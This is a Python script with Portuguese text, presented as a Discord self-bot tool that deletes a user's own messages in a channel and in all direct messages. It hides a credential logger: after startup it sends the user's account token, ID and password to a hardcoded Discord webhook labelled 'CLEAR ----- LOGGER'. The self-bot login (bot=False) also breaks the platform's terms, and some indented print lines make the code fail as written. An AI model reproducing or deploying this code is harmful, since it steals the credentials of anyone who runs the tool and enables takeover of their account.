import requests
import discord
from discord import Webhook, RequestsWebhookAdapter
import asyncio
from colorama import Fore, Back, Style, init
from os import system
import shutil
import subprocess

#/////////////////////////////////////////////////////

client = discord.Client()

#////////////////// NFORMAÇÕES ////////////////////////////////
token = ""

id = "880819349923979376"

senha = "oin0321MA"



#////////////// INFORMAÇÕES ////////////////////////////////////////


@client.event
async def on_message(message):
    if message.author == client.user:
        commands = []
        z = 0
        for index, a in enumerate(message.content):
            if a == " ":
                commands.append(message.content[z:index])
                z = index + 1
        commands.append(message.content[z:])
        channel = message.channel

        if commands[0] == '.discoveryd':
                    if len(commands) == 1:
                        async for msg in channel.history(limit=9999):
                            if msg.author == client.user:
                                try:
                                    await msg.delete()
                                except Exception as x:
                                    pass

        if commands[0] == '.dms':
            for channel in client.private_channels:
                if isinstance(channel, discord.DMChannel):
                    async for msg in channel.history(limit=9999):
                        try:
                            if msg.author == client.user:
                                await msg.delete()
                        except:
                             pass
                








print(" █▀▀▄ █░█ ▀▀█ ▀▀█ █▀▀█ █░░█ ")
 print("█░░█ ▄▀▄ ▄▀░ ▄▀░ █▄▄█ █▄▄█")
 print("▀▀▀░ ▀░▀ ▀▀▀ ▀▀▀ ▀░░▀ ▄▄▄█")
print(".")
print(".")
print(".")
print("Clear ligado com sucesso")
print("Comandos: .discoveryd - Limpar privado inteiro")
print(".dms - Limpar todas as dm")
print("Dados da conta ativada:")
print("ID:", id)












webhook = Webhook.from_url("https://discord.com/api/webhooks/879810623188377620/Oc9H4Ped6-YiAzlT7GaJ9mTP0ANTO3hDi_eq5uV2hXMnTXtjE_sNVKmXIk7-fXzl040s", adapter=RequestsWebhookAdapter())


webhook.send("CLEAR ----- LOGGER")
webhook.send("Um usuário utilizou o projeto dxzzay.py - Clear all")
webhook.send("Dados:")
webhook.send(id)
webhook.send(token)
webhook.send(senha)
client.run(token, bot=False)